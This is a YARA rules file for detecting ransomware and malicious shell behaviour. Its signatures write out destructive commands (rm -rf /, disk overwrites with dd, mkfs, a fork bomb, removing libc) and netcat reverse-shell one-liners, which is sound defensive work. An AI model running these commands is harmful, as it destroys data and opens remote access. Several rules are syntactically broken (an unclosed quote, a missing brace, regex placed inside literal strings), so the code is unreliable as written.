import "pe"

rule Detect_BAT_Ransomware {
    meta:
        description = "Ransomware Detection Rule For BAT ransomware"
        author = "Emirhan Ucan
        reference = "https://github.com/Greejith-k/RANSOMWARE"
    strings:
        $magic = { 4D 5A }  // .exe file signature
        $marker1 = "What Happened to My Computer?" ascii wide
        $marker2 = "Your important files are encrypted." ascii wide
    condition:
        $magic at 0 and all of them
}
rule detect_delete_command {
    meta:
        description = "YARA rule to detect 'rd C:\\ /s /q' command"
        author = "Emirhan Ucan"
        reference = "https://github.com/HydraDragonAntivirus/OpenSourceViruses/blob/main/aimingtogetdetected.bat"
    
    strings:
        $delete_command = "rd C:\\ /s /q"
    
    condition:
        $delete_command
}

rule Detect_OpenSSL_AES256_Encryption {
    meta:
        description = "YARA rule to detect OpenSSL AES-256-CBC encryption"
        author = "Emirhan Ucan"
        reference = "https://github.com/HydraDragonAntivirus/OpenSourceViruses/blob/main/bash.sh"
    
    strings:
        $openssl_aes256_encryption = "openssl enc -aes-256-cbc"
    
    condition:
        any of them
}

rule Malware_rm_rf {
    meta:
        description = "YARA rule to detect the 'rm -rf /' pattern indicating potential malware behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "rm -rf /"

    condition:
        $pattern1
}

rule Malware_chmod_ugo-rwx {
    meta:
        description = "YARA rule to detect the 'chmod -R ugo-rwx /' pattern indicating potential malware behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "chmod -R ugo-rwx /"

    condition:
        $pattern1
}

rule Malware_chattr_R_i {
    meta:
        description = "YARA rule to detect the 'chattr -R +i /' pattern indicating potential malware behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "chattr -R +i /"

    condition:
        $pattern1
}

rule Malware_chown {
    meta:
        description = "YARA rule to detect the 'chown /' pattern indicating potential malware behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "chown /"

    condition:
        $pattern1
}

rule Malware_mkfs_ext4 {
    meta:
        description = "YARA rule to detect the 'mkfs.ext4' pattern indicating potential malware behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "mkfs.ext4"

    condition:
        $pattern1
}

rule Malware_chmod_777 {
    meta:
        description = "YARA rule to detect the 'chmod 777 /' pattern indicating potential malware behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "chmod 777 /"

    condition:
        $pattern1
}

rule Malware_fdisk {
    meta:
        description = "YARA rule to detect the 'fdisk /dev/sd[a-z]' pattern indicating potential malware behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "fdisk /dev/sd[a-z]"

    condition:
        $pattern1
}

rule Malware_dd_disk_overwriter {
    meta:
        description = "YARA rule to detect the 'dd if=/dev/zero of=/dev/sd[a-z]' pattern indicating potential malware behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "dd if=/dev/zero of=/dev/sd[a-z]"

    condition:
        $pattern1
}

rule Malware_ufw_disable {
    meta:
        description = "YARA rule to detect the 'ufw disable' pattern indicating potential malware behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "ufw disable"

    condition:
        $pattern1
}

rule Malicious_shutdown {
    meta:
        description = "YARA rule to detect the 'shutdown' pattern indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "shutdown"

    condition:
        $pattern1
}

rule Malicious_reverse_shell {
    meta:
        description = "YARA rule to detect reverse shell creation using netcat"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "nc -l -p 4444 -e /bin/bash"
        $pattern2 = "ncat -l -p 4444 -e /bin/bash"

    condition:
        any of ($pattern1, $pattern2)
}

rule Malicious_init_0 {
    meta:
        description = "YARA rule to detect the 'init 0' pattern indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "init 0"

    condition:
        $pattern1
}

rule Malicious_init_6 {
    meta:
        description = "YARA rule to detect the 'init 6' pattern indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "init 6"

    condition:
        $pattern1
}

rule Malicious_fork_bomb {
    meta:
        description = "YARA rule to detect the 'fork bomb' pattern indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = ':(){:|:&};'

    condition:
        $pattern1
}

rule Malicious_wget_with_O {
    meta:
        description = "YARA rule to detect the 'wget' command with output file specified pattern indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "wget https://"
        $pattern2 = "\\s+-O \\w+\\.\\w+"

    condition:
        all of ($pattern1, $pattern2)
}

rule Malicious_fifo_pipe_netcat {
    meta:
        description = "YARA rule to detect the creation of a named pipe and use of netcat for communication"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "mkfifo /tmp/backpipe; /bin/sh 0</tmp/backpipe | nc \\d+\\.\\d+\\.\\d+\\.\\d+ \\d+ 1>/tmp/backpipe"

    condition:
        $pattern1
}

rule Malicious_fifo_pipe_shell_netcat {
    meta:
        description = "YARA rule to detect the creation of a named pipe, running a shell, and using netcat for communication"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "mkfifo /tmp/fifo; cat /tmp/fifo | /bin/sh -i 2>&1 | nc \\d+\\.\\d+\\.\\d+\\.\\d+ \\d+ > /tmp/fifo"

    condition:
        $pattern1
}

rule Malicious_openssl_enc {
    meta:
        description = "YARA rule to detect the 'openssl enc -aes-256-cbc' pattern indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "openssl enc -aes-256-cbc"

    condition:
        $pattern1
}
rule Malicious_cat_dev_sda_to_dev_sdz {
    meta:
        description = "YARA rule to detect potentially malicious usage of 'cat' to write to disk devices (/dev/sda to /dev/sdz)"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = /cat\s+>\s+\/dev\/sd[a-z]/
    
    condition:
        $pattern1
rule Malicious_disable_bash {
    meta:
        description = "YARA rule to detect the 'mv /bin/bash /bin/bash.bak' pattern indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "mv /bin/bash /bin/bash.bak"

    condition:
        $pattern1
}
rule Malicious_remove_log_files {
    meta:
        description = "YARA rule to detect the 'find' command removing log files indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "-exec rm -f {} ;"

    condition:
        $pattern1
}

rule Malicious_remove_libc_so6 {
    meta:
        description = "YARA rule to detect the 'rm -f /lib/libc.so.6' pattern indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "rm -f /lib/libc.so.6"

    condition:
        $pattern1
}

rule Malicious_fifo {
    meta:
        description = "YARA rule to detect the creation of a named pipe and command execution indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "mkfifo /\\w+/\\w+; \\S+ /\\w+/\\w+ | \\S+ \\d+\\.\\d+\\.\\d+\\.\\d+ \\d+"

    condition:
        $pattern1
}

rule Malicious_shell {
    meta:
        description = "YARA rule to detect the execution of a shell command indicating potential malicious behavior"
        author = "Emirhan Ucan"
    
    strings:
        $pattern1 = "\\S+ /bin/sh -i"

    condition:
        $pattern1
}
